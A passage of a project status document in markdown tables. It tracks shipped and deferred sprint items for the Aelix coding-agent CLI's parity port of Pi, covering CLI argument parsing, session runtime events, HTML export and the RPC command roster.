| `--list-models` `@` exclusion (W6 P-397 MAJOR — Pi `args.ts:154-160` dual `-` AND `@` guard; `aelix --list-models @config.json` keeps `@file` in `file_args` not consumed as search pattern) + new regression test `test_list_models_does_not_eat_file_arg` | shipped | ADR-0089 |
| Unknown-flag `@` exclusion (W6 P-398 MAJOR — Pi `args.ts:167-180` dual `-` AND `@` guard; `--my-ext @input.txt msg` leaves `@file` in `file_args` and `msg` in `messages`) + new regression test `test_unknown_flag_does_not_eat_file_arg` | shipped | ADR-0089 |
| `print_help(out: TextIO \| None = None)` typing upgrade with `stream: TextIO = ...` annotation (W6 W4 MAJOR; `TextIO` import guarded by `TYPE_CHECKING` so zero runtime cost) | shipped | ADR-0089 |
| `_is_value` helper removed (orphaned after P-396 inline predicate replacement; dead-code drop) | shipped | ADR-0089 |
| ADR-0034 amendment — Sprint 6h₆ row (Aelix CLI entrypoint shipped; RPC roster UNCHANGED at 29/0/29; Pi pin held at `734e08e` — no advance) | shipped | ADR-0034 |
| Phase 5b TUI library decision analysis (textual / rich / prompt-toolkit / blessed evaluation + library-agnostic `Component` Protocol invariant + 10 open questions) | proposed (DEFERRED to Phase 5b W0) | ADR-0088 |
| `SettingsManager` (disk-persisted user settings + model defaults + theme prefs) | deferred to Sprint 5a-iii | ADR-0089 |
| `--list-models` real wire (currently emits stderr "deferred to 5a-iii" diagnostic) | deferred to Sprint 5a-iii | ADR-0089 |
| `cli/file-processor.ts` image branch (`image-resize` + ImageContent inflation) | deferred to Sprint 5a-iii | ADR-0089 |
| `--append-system-prompt` harness wire (currently parsed + recorded but not threaded to the prompt) | deferred to Sprint 5a-iii | ADR-0089 |
| `ResourceLoader` port (resolves `@`-prefixed system prompts + `--append-system-prompt` files) | deferred to Sprint 5a-iii | ADR-0089 |
| Pi `print_help` full text (env vars section + examples + built-in tool names + extension-supplied flags) | deferred to Sprint 5a-iii | ADR-0089 |
| Pi `Session.subscribe` / `Session.bind_extensions` surface (P-395 carry-forward) | deferred to Sprint 5a-iii | ADR-0089 |
| `is_disposed` predicate on runtime for double-dispose verification (P-404) | deferred to Sprint 5a-iii | ADR-0089 |
| Pi migrations (session schema + settings migrations) | deferred to Sprint 5a-iv | ADR-0089 |
| Pi session-picker `--resume` interactive picker | deferred to Sprint 5a-iv (requires Phase 5b TUI primitives) | ADR-0089 |
| Interactive TUI mode (textual + rich PRIMARY recommendation; prompt-toolkit + rich ALTERNATIVE; textual alone CONTINGENCY) | deferred to Phase 5b | ADR-0088 |
| TTY second-pass demotion (Pi re-evaluates TTY status after stdin consumption — interactive mode prerequisite) | deferred to Phase 5b | ADR-0089 |
| `killTrackedDetachedChildren` (Bash extension detached-children tracker prerequisite) | deferred — demand-driven | ADR-0089 |
| `takeOverStdout` (only if a builtin starts corrupting the JSON stream — Aelix builtins don't corrupt today) | deferred — demand-driven | ADR-0089 |

Sprint 6h₆ ships the non-interactive CLI **without** moving the RPC
roster needle (SUPPORTED stays at 29, DEFERRED stays at 0, total
stays at 29) and **without** advancing the Pi pin
(`734e08e…` preserved). The Aelix-additive CLI surface lands as a
strict Pi-parity port modulo 12 documented divergences (see ADR-0089
§"Aelix-additive divergences from Pi"). **Verification gates green**:
2077 passed + 1 skipped tests (2074 baseline + 3 Pi-parity regression
tests), 8 pyright errors baseline preserved, ruff clean. `aelix
--version` + `python -m aelix_coding_agent --version` both return
`0.1.0`. **B 단계 (Phase 5) formally opens** — Pi pin advances permitted
starting B 단계 per ADR-0034 update policy (Sprint 6h₆ scope does
not exercise the advance permission).

### Sprint 6h₅c sub-table (Phase 4.16 closure — visual fidelity + context_usage + bootstrap session_start + factory cwd + ImageContent — **A 단계 CLOSED**; **RPC roster STAYS CLOSED**)

Counts UNCHANGED at **29 supported / 0 deferred / 29 total**. Runtime
/ visual polish doesn't change the dispatch table. ADR-0084
§"Sprint 6h₅c carry-forward" CLOSES per ADR-0085 (5 binding items).
W4/W5 audit returned **0 CRITICAL / 0 HIGH / 1 MAJOR + 1 MEDIUM + 3
MINOR + 1 NIT** — every load-bearing must-fix landed in W6 closure
(P-374 W5 MAJOR + W4 MEDIUM + P-377 W5 MINOR + W4 NIT). The closure
pin lane sits on the 4 new unit-test files this sprint (no new
`tests/pi_parity/` closure pin file lands — no new `HookEventName`
literal, no new RPC commands). **A 단계 (Phase 4 strict Pi-parity
superset) CLOSED end-to-end** — ADR-0086 records the full 14-row
delivery ledger across the 6a → 6h₅c sprint chain.

| Item | Status | Owner ADR |
|---|---|---|
| `session/compaction.py` 4 Pi-parity helpers — `calculate_context_tokens` / `estimate_tokens` / `estimate_context_tokens` / `get_latest_compaction_entry` (P-369 BINDING — Pi `compaction.ts:135-279`) | shipped | 0085 |
| `estimate_tokens` :class:`ThinkingContent` branch BEFORE catch-all (W4 MEDIUM fix — Pi treats every content block uniformly; W2 catch-all `hasattr(block, "text")` missed `block.thinking`; thinking blocks silently contributed zero tokens to estimates) | shipped | 0085 |
| `AgentHarness._get_context_usage_safe` real async impl (P-369 BINDING — Pi `agent-session.ts:2946-2990` `getContextUsage`); 4-branch logic (no-model → None / no-session → heuristic / compaction-no-usage → sentinel / default → full triple); method becomes `async` because `Session.get_branch` is async in Aelix (Pi's `getBranch()` is sync); 3 callers updated with `await` | shipped | 0085 |
| `_ExtensionContext.get_context_usage` real sync bridge (W6 P-374 W5 MAJOR fix — W2 left Sprint 5a `return None` stub even after P-369 landed; bridge uses heuristic estimate path inline because Pi's `getContextUsage` returns sync; full async algorithm reachable via async harness method — Aelix-additive divergence #3 per ADR-0085) | shipped | 0085 |
| `runtime/agent_session_runtime.py` module-level :func:`create_agent_session_runtime` async factory (P-370 BINDING — Pi `agent-session-runtime.ts:382-400`) | shipped | 0085 |
| Factory bootstrap `assert_session_cwd_exists` site (P-370 BINDING — Pi `:391`; runs against `harness._session` BEFORE :class:`AgentSessionRuntime` construction; skipped silently when `harness._session is None` for in-memory tests) | shipped | 0085 |
| Factory bootstrap `session_start(reason="startup")` emit (P-371 BINDING — Pi `:326` + `:2050`; optional `session_start_event=None` kwarg mirrors Pi `??` default; gated on `ExtensionRunner.has_handlers`; raises caught + logged matching :meth:`_finish_session_replacement` P-343 emit policy; `reload` branch defers to Sprint 6h₅d) | shipped | 0085 |
| `runtime/__init__.py` re-exports :func:`create_agent_session_runtime` | shipped | 0085 |
| `_export_html/` directory restructure (P-372 BINDING — Pi `coding-agent/src/core/export-html/`); 3-module package: `__init__.py` (re-exports `export_html`) + `template.py` (`_THEME_CSS` curated ~240 LOC dark theme + Pygments token classes via `HtmlFormatter.get_style_defs(".pyg")` + `_HTML_TEMPLATE` HTML5 skeleton) + `format.py` (renderer pipeline: markdown-it-py commonmark + table + breaks; Pygments fenced code hook; role-section dispatch; content-block renderer) | shipped | 0085 |
| `_export_html.py` single-file Sprint 6h₃ minimal renderer DELETED (replaced by 3-module package) | shipped | 0085 |
| `pygments>=2.18` + `markdown-it-py>=3.0` added to `packages/aelix-coding-agent/pyproject.toml` (P-372 supporting infra) | shipped | 0085 |
| :class:`ImageContent` HTML rendering (P-373 BINDING) — inline base64 `<img>` tag with `data:{mime};base64,{data}` URI mirroring Pi `template.js:909`; non-tool-result variant `class="message-image"`; CSS `.message-image { max-width: 100%; max-height: 400px; }` + `.tool-image { max-height: 500px; }` | shipped | 0085 |
| Strict Pi `tool-image` class literal (W6 P-377 W5 MINOR fix — Pi `template.js:909` uses `class="tool-image"` ONLY for tool-result images; W2 emitted combined `class="message-image tool-image"`; W6 emits literal `"tool-image"` byte-for-byte) | shipped | 0085 |
| W4 NIT — dead code drop in `tests/harness/test_context_usage.py` (`chars_tool = msg_tool.content[0]; _ = chars_tool` removed) | shipped | 0085 |
| `tests/harness/test_context_usage.py` (NEW — 9 tests: ThinkingContent branch + `_ExtensionContext.get_context_usage` real-bridge tests + Pi-shape helper assertions) | shipped | 0085 |
| `tests/harness/test_harness_get_session_stats.py` (AMEND — async `_get_context_usage_safe` migration) | shipped | 0085 |
| `tests/test_factory_assert_session_cwd.py` (NEW — 3 tests: cwd-assertion fires BEFORE construction + skips when no session + uses harness session for cwd) | shipped | 0085 |
| `tests/test_bootstrap_session_start.py` (NEW — 5 tests: factory emits with `reason="startup"` + custom event override + skip-when-no-handlers + replacement uses `reason="new"`/`"resume"` regression + bootstrap runs after construction) | shipped | 0085 |
| `tests/test_export_html_visual_fidelity.py` (NEW — 7 tests: base64 img tag + Pi-strict tool-image class + XSS-safe escape + markdown paragraph + Pygments token classes + unknown-lang fallback + theme CSS includes Pygments styles) | shipped | 0085 |
| **A 단계 closure ledger** (ADR-0086 — 14-row delivery mapping across 6a → 6h₅c) | shipped | 0086 |
| ADR-0034 amendment — Sprint 6h₅c Phase 4.16 row (visual fidelity + context_usage + bootstrap + cwd + ImageContent; RPC roster UNCHANGED; **A 단계 closure milestone**) | shipped | 0034 |
| ADR-0084 amendment — Sprint 6h₅c carry-forward CLOSE note (5 items CLOSED per ADR-0085 / ADR-0086) | shipped | 0084 |
| ANSI → HTML pipeline (Pi `ansi-to-html.ts`) | deferred to Sprint 6h₅d | 0085 |
| Tool-renderer per-tool templates (bash / read / write / edit / ls) | deferred to Sprint 6h₅d | 0085 |
| Client-side JS port (sidebar / tree navigation) | deferred to Sprint 6h₅d | 0085 |
| Pi color-derivation math (luminance-based theme) | deferred to Sprint 6h₅d | 0085 |
| `reload()` bootstrap emit branch (Pi `:2401` — `reason="reload"`) | deferred to Sprint 6h₅d | 0085 |
| Pixel-perfect HTML closure pin tests | deferred to Sprint 6h₅d | 0085 |
| P-375 monkeypatch fragility in `tests/test_factory_assert_session_cwd.py` (replace runtime attribute monkeypatch with proper test seam) | deferred to Sprint 6h₅d | 0085 |
| MINOR-1 f-string assembly polish in `_export_html/format.py` | deferred to Sprint 6h₅d | 0085 |
| MINOR-3 `harness._session` private-attribute reads (introduce read-through property or factory accessor) | deferred to Sprint 6h₅d | 0085 |
| Live `session_id` read via session manager (P-291 from ADR-0074) | deferred to Sprint 6h₅d | 0085 |
| Pi-source-grep verification tooling (P-286 from ADR-0074) | deferred to Sprint 6h₅d | 0085 |

### Sprint 6h₅a sub-table (Phase 4.14 closure — extension event Pi parity wired; **RPC roster STAYS CLOSED**)

Counts UNCHANGED at **29 supported / 0 deferred / 29 total**. Extension
polish doesn't change the dispatch table. The closure pin
(`tests/pi_parity/test_phase_4_14_extension_events.py`) asserts the
35-name `HookEventName` cascade + 35-overload count + shared
`_reducer_session_before` across 4 cancellable arms + Pi line
citation drift detector + cancel-aggregation first-cancel-wins +
exception isolation + reducer type widening + W0 fixture pin. The
P-355 dispose ordering correction (W2 §J "intentional asymmetry"
refuted; Pi has uniform **EMIT → INVALIDATE → DISPOSE**) and the W4
MEDIUM switch_session assert-before-emit ordering correction land
this sprint.

| Item | Status | Owner ADR |
|---|---|---|
| `HookEventName` Literal widened 31 → **35** names (`session_start` / `session_before_switch` / `session_before_fork` / `session_shutdown`) | shipped | 0081 |
| `AgentHarnessEventName` Literal widened 18 → **22** names (same 4 extension session lifecycle events folded into harness own bucket per ADR-0036 pattern) | shipped | 0081 |
| 4 new `@dataclass(frozen=True)` event payloads (`SessionStartHookEvent` / `SessionBeforeSwitchHookEvent` / `SessionBeforeForkHookEvent` / `SessionShutdownHookEvent`) | shipped | 0081 |
| 2 new result types (`SessionBeforeSwitchResult` / `SessionBeforeForkResult` — Pi `extensions/types.ts:1015-1022` with `cancel?` + `skipConversationRestore?` per P-345) | shipped | 0081 |
| 4 new `@overload` declarations on `HookBus.on` / `ExtensionAPI.on` (31 → **35** overloads) | shipped | 0081 |
| `_REDUCERS` registry shares `_reducer_session_before` across 4 cancellable arms (compact / tree / switch / fork — reducer return type widened to 4-arm union per P-335) | shipped | 0081 |
| `_emit_session_shutdown_event` module-private helper (Pi `runner.ts:177-189`) | shipped | 0081 |
| `AgentSessionRuntime._emit_before_switch` real body — Pi `:115-130` (replaces 6h₄b stub; W4 MINOR-3 required args) | shipped | 0081 |
| `AgentSessionRuntime._emit_before_fork` real body — Pi `:132-147` (replaces 6h₄b stub; W4 MINOR-3 required args) | shipped | 0081 |
| `AgentSessionRuntime._teardown_current` ORDERING CORRECTION (P-340) — Pi `:149-157` **EMIT → INVALIDATE → DISPOSE** (6h₄b shipped reversed order with NO shutdown emit) | shipped | 0081 |
| `AgentSessionRuntime.dispose` adds `session_shutdown(quit)` emit (P-341 — Pi `:366-373`) | shipped | 0081 |
| `AgentSessionRuntime.dispose` ORDERING CORRECTION (P-355 W5 BLOCKING FIX) — **EMIT → INVALIDATE → DISPOSE** (matches `_teardown_current`; the W2 §J "intentional asymmetry" rationale was a Pi misread of `:366-373`) | shipped | 0081 |
| `AgentSessionRuntime.switch_session` ORDERING CORRECTION (W4 MEDIUM) — lifts `repo.open` + `assert_session_cwd_exists` BEFORE `_emit_before_switch` to match Pi `:184-189` | shipped | 0081 |
| `previous_session_file` snapshot BEFORE teardown at all 3 replace sites + threaded into `_finish_session_replacement` (P-342) | shipped | 0081 |
| `AgentSessionRuntime._finish_session_replacement` emits `session_start` on NEW harness's runner AFTER `rebind_session` (P-343); bootstrap `session_start` defers to Sprint 6h₅b | shipped | 0081 |
| `session/session_cwd.py` (NEW — Pi port of `session-cwd.ts:1-59`; async-adapted) | shipped | 0081 |
| `format_missing_session_cwd_error` Pi-verbatim format (P-346 BLOCKING FIX) — Pi `:30-37` | shipped | 0081 |
| `format_missing_session_cwd_prompt` Pi port (P-347 BLOCKING FIX) — Pi `:40-42` | shipped | 0081 |
| `SessionCwdIssue` field shape change (P-346) — `session_file: str \| None` (optional) + `fallback_cwd: str` (required non-optional) matching Pi | shipped | 0081 |
| `assert_session_cwd_exists` wired into `switch_session` AFTER `repo.open` (P-337); factory bootstrap + `importFromJsonl` call sites defer to Sprint 6h₅c | shipped | 0081 |
| Pi line citation corrections (P-344 W5 BLOCKING FIX) — verified at SHA `734e08e`: `:513-519` / `:522-526` / `:529-533` / `:552-557` | shipped | 0081 |
| `tests/pi_parity/test_phase_4_14_extension_events.py` closure pin (14 invariants) | shipped | 0082 |
| `tests/pi_parity/fixtures/pi_extension_events_734e08e.json` (NEW W0 fixture) | shipped | 0081 |
| `tests/pi_parity/fixtures/pi_agent_harness_event_names_734e08e.json` (AMEND — 4 new events + 4 P-344 line citations) | shipped | 0081 |
| `tests/runtime/test_agent_session_runtime_extension_events.py` (NEW — 9 wiring tests including P-355 dispose ordering pin) | shipped | 0081 |
| `tests/runtime/test_agent_session_runtime_session_cwd.py` (NEW — 3 wiring tests including assert-after-open ordering pin) | shipped | 0081 |
| `tests/session/test_session_cwd_helper.py` (NEW — 10 unit tests covering P-337 + P-346 + P-347 + field shape change) | shipped | 0081 |
| `tests/session/test_session_file_property.py` (NEW — P-349 cross-reference pin) | shipped | 0081 |
| `tests/extensions/test_extension_runner_emit_delegate.py` (NEW — P-333 ExtensionRunner bridge tests) | shipped | 0081 |
| `tests/pi_parity/test_hook_event_name_literal_pi_parity.py` (AMEND — 35-name cascade pin) | shipped | 0081 |
| `tests/pi_parity/test_phase_3_1_strict_superset.py` (AMEND — cascade count update for 35-name fixture) | shipped | 0081 |
| `tests/test_hook_payload_roundtrip.py` (AMEND — 4 new events added to roundtrip coverage) | shipped | 0081 |
| `tests/test_overloads_extension_api.py` (AMEND — 35-overload count assertion) | shipped | 0081 |
| ADR-0034 amendment — Sprint 6h₅a Phase 4.14 row (extension event wiring; RPC roster UNCHANGED) | shipped | 0034 |
| ADR-0080 amendment — Sprint 6h₅a P-307 / P-308 carry-forward CLOSE note | shipped | 0080 |
| `with_session` 2-stage callback (P-314 from ADR-0080) | deferred to Sprint 6h₅b | 0082 |
| `setup` callback in `new_session` (P-314 sibling) | deferred to Sprint 6h₅b | 0082 |
| `set_rebind_session` / `set_before_session_invalidate` optional-cb signature widening (P-315 from ADR-0080) | deferred to Sprint 6h₅b | 0082 |
| `forkFrom` cross-cwd import (no RPC wire today; P-314 carry-forward) | deferred to Sprint 6h₅b | 0082 |
| `import_from_jsonl` real runtime body (no RPC wire today; P-310 carry-forward) | deferred to Sprint 6h₅b | 0082 |
| `session_start` bootstrap emit (`reason="startup"` / `"reload"`; factory pattern change required) | deferred to Sprint 6h₅b | 0082 |
| P-351 `ExtensionRunner.invalidate` semantics (Pi `runner.ts` `invalidated` flag) | deferred to Sprint 6h₅b | 0082 |
| Pi HTML visual fidelity (CSS / syntax highlighting / responsive layout — ADR-0074 carry-forward) | deferred to Sprint 6h₅c | 0082 |
| `ImageContent` rendering in HTML export (ADR-0074 carry-forward) | deferred to Sprint 6h₅c | 0082 |
| `_get_context_usage_safe` real implementation (P-282 from ADR-0074) | deferred to Sprint 6h₅c | 0082 |
| Live `session_id` read via session manager (P-291 from ADR-0074) | deferred to Sprint 6h₅c | 0082 |
| Pi-source-grep verification tooling (P-286 from ADR-0074) | deferred to Sprint 6h₅c | 0082 |
| Factory bootstrap `assertSessionCwdExists` call site (Pi `:391`) | deferred to Sprint 6h₅c | 0082 |
| `importFromJsonl` `assertSessionCwdExists` call site (Pi `:352`) | deferred to Sprint 6h₅c | 0082 |

### Sprint 6h₅b sub-table (Phase 4.15 closure — runtime callback Pi parity wired; **RPC roster STAYS CLOSED**)

Counts UNCHANGED at **29 supported / 0 deferred / 29 total**. Runtime /
extension polish doesn't change the dispatch table. ADR-0082
§"Sprint 6h₅b carry-forward" CLOSES per ADR-0083 (5 binding + 1
W2-already-shipped P-315 item). W4/W5 audit returned **3 MAJOR + 2
MINOR (no BLOCKING)** — every must-fix landed in W6 closure
(P-364 ~ P-368). The closure pin lane sits on the 6 new unit-test
files this sprint (no new `tests/pi_parity/` closure pin file lands —
no new `HookEventName` literal, no new RPC commands).

| Item | Status | Owner ADR |
|---|---|---|
| `ReplacedSessionContext` Protocol in `runtime/_types.py` (P-356 BINDING — Protocol over `types.SimpleNamespace` factory output; structural conformance via `typing.runtime_checkable` — Aelix-additive divergence #1 per ADR-0083) | shipped | 0083 |
| `AgentHarness.create_replaced_session_context` factory (P-357 BINDING — Pi `agent-session.ts:3087-3095`; `SimpleNamespace` mirror of Pi `Object.defineProperties` clone idiom — Aelix-additive divergence #2 per ADR-0083) | shipped | 0083 |
| `with_session` plumbed onto `switch_session` / `new_session` / `fork` / `_finish_session_replacement` (P-358 BINDING — Pi `:172-173`/`:289-291`/`:316-318`) | shipped | 0083 |
| `setup` callback in `new_session` AFTER apply BEFORE rebind + rebuilds `harness._state.messages` from NEW `build_context()` (P-359 BINDING — Pi `:226-229`) | shipped | 0083 |
| `AgentSessionRuntime.import_from_jsonl` real body — Pi `:329-364` port (P-360 BINDING — replaces Sprint 6h₄c `NotImplementedError` stub; cancel short-circuit + copy-when-different + cwd override via `dataclasses.replace` + `assert_session_cwd_exists`) | shipped | 0083 |
| `JsonlSessionRepo.fork_from` cross-cwd import surface (P-361 BINDING — Pi `session-manager.ts:1353-1394`; ALL entries copy, no leaf truncation unlike `fork`; no internal consumer this sprint — CLI `/branch-from` lands Phase 5) | shipped | 0083 |
| `ExtensionRunner.invalidate` + `_invalidate_runtime` runtime bridge (P-362 BINDING — SYNTHESIS per spec §J: runner is Pi-named entry point that delegates; runtime is single source of truth; runner holds NO `_stale_message` field) | shipped | 0083 |
| `PI_STALENESS_MESSAGE` constant in `runtime/_types.py` (P-362 BINDING — Pi verbatim from `runner.ts:467`; single source of truth shared by `ExtensionRunner.invalidate` and `_ExtensionRuntime.invalidate`) | shipped | 0083 |
| `_ExtensionRuntime.invalidate` default arg aligned to `PI_STALENESS_MESSAGE` (P-362 BINDING — bypass-runner callers see SAME message as routed callers) | shipped | 0083 |
| `ExtensionRunner` dataclass drops `frozen=True` (P-362 BINDING — required to allow `_invalidate_runtime` bridge field rebind by tests) | shipped | 0083 |
| `runner.invalidate(PI_STALENESS_MESSAGE)` call inserted in `_teardown_current` + `dispose` between EMIT and `before_session_invalidate` (P-363 BINDING — Pi `runner.ts:466-473`) | shipped | 0083 |
| `SessionImportFileNotFoundError` Pi-verbatim alignment (W6 P-366 W5 MAJOR fix — Pi `agent-session-runtime.ts:39-47`: message `File not found: {file_path}` + `file_path` attribute snake_case of Pi `filePath`) | shipped | 0083 |
| `ReplacedSessionContext` Protocol widened 13 → 19 members (W6 P-364 W5 MAJOR fix — adds 6 `ExtensionCommandContext` methods per Pi `extensions/types.ts:371` `ReplacedSessionContext extends ExtensionCommandContext`: `wait_for_idle` / `new_session` / `fork` / `navigate_tree` / `switch_session` / `reload`) | shipped | 0083 |
| `create_replaced_session_context(runtime=...)` factory kwarg wires 6 ExtensionCommandContext methods (W6 P-364 W5 MAJOR fix — harness-side `wait_for_idle` / `navigate_tree` + runtime-side `new_session` / `fork` / `switch_session` + Aelix-additive `reload` stub) | shipped | 0083 |
| `_finish_session_replacement` threads `self` as `runtime` kwarg to `create_replaced_session_context` (W6 P-364 W5 MAJOR fix — so post-replace work routes through the SAME runtime that just replaced this harness) | shipped | 0083 |
| `ExtensionRunner.assert_active` delegates to runtime via bridge (W6 P-365 W5 MAJOR fix — Pi `runner.ts:475-478`; raises plain `RuntimeError(staleMessage)` to avoid `aelix_agent_core → aelix_coding_agent` reverse import; `ExtensionError` continues to fire via `ExtensionContext.__getattribute__` — Aelix-additive divergence #4 per ADR-0083) | shipped | 0083 |
| `JsonlSessionRepo.open(cwd_override=...)` repo seam (W6 P-367 W5 MINOR fix — replaces `storage._metadata` mutation in `import_from_jsonl` from outside the repo; centralizes Pi `SessionManager.open(path, dir, cwdOverride)` parity on a single owner) | shipped | 0083 |
| `JsonlSessionRepo.fork_from(session_dir=...)` optional Pi 3rd parameter (W6 P-368 W5 MINOR fix — Pi `forkFrom(source, targetCwd, sessionDir?)`; default behavior unchanged for existing callers) | shipped | 0083 |
| `FileSystem.copy_file` Protocol method + `LocalFileSystem.copy_file` impl backed by `shutil.copy2` (P-360 supporting infra) | shipped | 0083 |
| `tests/runtime/test_replaced_session_context.py` (NEW — 8 tests: factory `SimpleNamespace` + Protocol conformance + baseline fields + send_message routing + send_user_message routing + 6 ExtensionCommandContext method exposure + unbound-runtime raise + reload Aelix-additive stub) | shipped | 0083 |
| `tests/runtime/test_with_session_callback.py` (NEW — 6 tests: 3 replace APIs accept with_session + ctx bound to NEW harness + raises propagate + ordering rebind → with_session) | shipped | 0083 |
| `tests/runtime/test_setup_callback_new_session.py` (NEW — 4 tests: setup invoked with NEW session_manager + runs before rebind + appends visible in rebuilt messages + optional path when None) | shipped | 0083 |
| `tests/runtime/test_import_from_jsonl_real.py` (NEW — 6 tests: missing path raises + Pi-verbatim `File not found: {file_path}` message + `file_path` attribute + same-dir skips copy + cwd override rewrites metadata + cancel short-circuits + different-dir copies) | shipped | 0083 |
| `tests/session/test_jsonl_fork_from.py` (NEW — 7 tests: ALL entries copied no truncation + target cwd matches + parent_session_path = source path + new id/path distinct + round-trip through `repo.open` + optional session_dir override + default resolution preserved) | shipped | 0083 |
| `tests/harness/test_extension_runner_invalidate.py` (NEW — 9 tests: bridge propagation + default = PI_STALENESS_MESSAGE + idempotent + no-bridge no-op + harness wires bridge + runtime default aligned + teardown invokes invalidate + dispose invokes invalidate + assert_active SYNTHESIS no-op) | shipped | 0083 |
| `tests/extensions/test_extension_runner_emit_delegate.py` (AMEND — `frozen=True` drop verified per P-362) | shipped | 0083 |
| `tests/runtime/test_agent_session_runtime.py` (AMEND — `import_from_jsonl` stub coverage test migrated to `test_import_from_jsonl_real.py`) | shipped | 0083 |
| ADR-0034 amendment — Sprint 6h₅b Phase 4.15 row (runtime callback Pi parity; RPC roster UNCHANGED) | shipped | 0034 |
| ADR-0082 amendment — Sprint 6h₅b carry-forward CLOSE note (5 items CLOSED per ADR-0083) | shipped | 0082 |
| `session_start` bootstrap emit (`reason="startup"` / `"reload"`; factory pattern change required) | deferred to Sprint 6h₅c | 0084 |
| Factory bootstrap `assertSessionCwdExists` call site (Pi `:391`) | deferred to Sprint 6h₅c | 0084 |
| Pi HTML visual fidelity (CSS / syntax highlighting / responsive layout) | deferred to Sprint 6h₅c | 0084 |
| `ImageContent` rendering in HTML export | deferred to Sprint 6h₅c | 0084 |
| `_get_context_usage_safe` real implementation (P-282 from ADR-0074) | deferred to Sprint 6h₅c | 0084 |
| Live `session_id` read via session manager (P-291 from ADR-0074) | deferred to Sprint 6h₅c | 0084 |
| Pi-source-grep verification tooling (P-286 from ADR-0074) | deferred to Sprint 6h₅c | 0084 |

### Sprint 6h₄c sub-table (Phase 4.13 closure — **PHASE 4 RPC ROSTER CLOSED**)

Counts move **26 supported / 3 deferred / 29 total → 29 supported / 0 deferred / 29 total**
= full Pi parity for the 29-variant `RpcCommand` discriminator union at
SHA `734e08e`. `SUPPORTED_COMMANDS == RPC_COMMAND_TYPES` (full set
equality) and `DEFERRED_COMMANDS == {}` (literal empty). **This is the
LAST RPC sprint for Phase 4** — remaining Pi parity gaps are runtime /
extension polish (no RPC dispatch impact).

| Item | Status | Owner ADR |
|---|---|---|
| `AgentSessionRuntime.__init__` constructor extended with required keyword-only `repo: JsonlSessionRepo` + `fs: FileSystem` (P-324 BINDING — rejecting Optional shape is deliberate; compile-time enforcement) | shipped | 0079 |
| `AgentSessionRuntime.switch_session` real body — `repo.open(load_jsonl_session_metadata(fs, path))` → `_finish_session_replacement` (P-325) | shipped | 0079 |
| `AgentSessionRuntime.new_session` real body — `repo.create(JsonlSessionCreateOptions(cwd, parent_session_path))` → `_finish_session_replacement` (P-325 / P-330 — replaces Sprint 6d rejection stub) | shipped | 0079 |
| `AgentSessionRuntime.fork` real body — `repo.fork(source, ForkOptions(cwd, entry_id=target_leaf_id, position="at", parent_session_path))` — Aelix persisted-only (drops Pi in-memory branch `:303-319`) (P-325) | shipped | 0079 |
| `AgentSessionRuntime.import_from_jsonl` STAYS STUBBED — no Pi `RpcCommand` discriminator maps to it at SHA `734e08e` (Pi TUI `/import` doesn't go through RPC dispatch; carry-forward per ADR-0080) | shipped | 0079 |
| `_extract_user_message_text` module-private helper (Pi `agent-session-runtime.ts:49-58`) | shipped | 0079 |
| `_apply_for_test` test seam REMOVED from `AgentSessionRuntime` — 6h₄b unit tests migrated to drive `switch_session` via real public API (P-331) | shipped | 0079 |
| NEW `_SUPPORTED_HANDLERS_RUNTIME_HOST` arity class — 4 handlers `(new_session, switch_session, fork, clone)` taking `(runtime_host, cmd)` instead of `(harness, cmd)` (P-326) | shipped | 0079 |
| `_bind_runtime_host(handler, runtime_host)` adapter closure (P-326 — keeps dispatch table uniform 2-arg `(harness, cmd)` shape) | shipped | 0079 |
| `_make_missing_runtime_handler(cmd_type)` Pi-shape error stub for `build_dispatch_table(runtime_host=None)` test fixture path (P-326-DRIFT RATIFIED) | shipped | 0079 |
| `build_dispatch_table(model_registry, *, runtime_host=None)` — `runtime_host` Optional with missing-runtime stub fallback (P-326-DRIFT RATIFIED) | shipped | 0079 |
| `_make_passthrough_runtime(harness, harness_factory, *, repo=None, fs=None)` — Pi defaults via `LocalFileSystem` + `JsonlSessionRepo(fs=...)` when caller omits (P-324-DRIFT RATIFIED) | shipped | 0079 |
| `run_rpc_mode(..., repo=None, fs=None)` signature extension — passthrough threads Pi defaults when `runtime_host=None` (P-324) | shipped | 0079 |
| `_handle_switch_session` real handler (Pi `rpc-mode.ts:563-569`) — wire shape `{cancelled}` (Pi line 568) | shipped | 0079 |
| `_handle_fork` real handler (Pi `rpc-mode.ts:571-577`) — wire shape `{cancelled, text?}` with `text` key OMITTED when `selected_text is None` (P-327 / P-298 pattern — `selectedText → text` rename) | shipped | 0079 |
| `_handle_clone` real handler (Pi `rpc-mode.ts:579-589`) — leaf_id captured BEFORE OLD harness dispose (P-328 ordering); wire shape `{cancelled}` only (Pi line 588 drops `selectedText` for clone) | shipped | 0079 |
| `_handle_new_session` REPLACED — Sprint 6d stub deleted; routes through `runtime_host.new_session(parent_session=cmd.parent_session)`; **ADR-0058 `parent_session` carry-forward CLOSES** (P-330) | shipped | 0079 |
| P-329 deliberate convergence — Aelix handlers MUST NOT call rebind manually (Pi belt-and-braces `await rebindSession()` at `rpc-mode.ts:566`/`:574`/`:586` NOT mirrored; runtime's `_finish_session_replacement` is single source of truth — exactly-once invocation per replace) | shipped | 0079 |
| W4 MINOR-1 — Double-catch collapse in `_handle_fork` + `_handle_clone` (keep `ValueError` arm Pi-documented at `:247`; drop blanket `except Exception`) | shipped | 0079 |
| W4 MINOR-2 — Blanket `except Exception` dropped from `_handle_switch_session` (outer `_handle_command` wraps) | shipped | 0079 |
| W4 MINOR-3 — `test_handle_fork_wire_shape_omits_text_when_none` rewritten to drive handler via mocked `AgentSessionRuntime` returning `RuntimeReplaceResult(cancelled=False, selected_text=None)` so handler-layer key-omission invariant is asserted end-to-end | shipped | 0079 |
| W4 MINOR-4 — `_handle_new_session` blanket `except RuntimeError` dropped (avoid masking noop-factory leaks; `Passthrough runtime cannot replace harness` now fails loud) | shipped | 0079 |
| `tests/pi_parity/test_phase_4_13_strict_superset.py` closure pin (29 / 0 / 29 + `SUPPORTED_COMMANDS == RPC_COMMAND_TYPES` full set equality + `DEFERRED_COMMANDS == {}` literal + handler invariants + `_apply_for_test` removed + wire shapes + rebind exactly-once + leaf_id pre-capture ordering + Pi line citations + 4-entry RUNTIME_HOST arity class) | shipped | 0080 |
| `tests/pi_parity/fixtures/pi_runtime_wire_734e08e.json` W0 fixture (SHA-pinned + immutable) | shipped | 0079 |
| `tests/runtime/test_agent_session_runtime_replace_apis.py` (NEW — real `switch_session` / `new_session` / `fork` over tmp-path `JsonlSessionRepo`) | shipped | 0079 |
| `tests/runtime/test_switch_session.py` / `test_fork.py` / `test_new_session_real.py` (NEW — runtime-layer unit tests for each replace API) | shipped | 0079 |
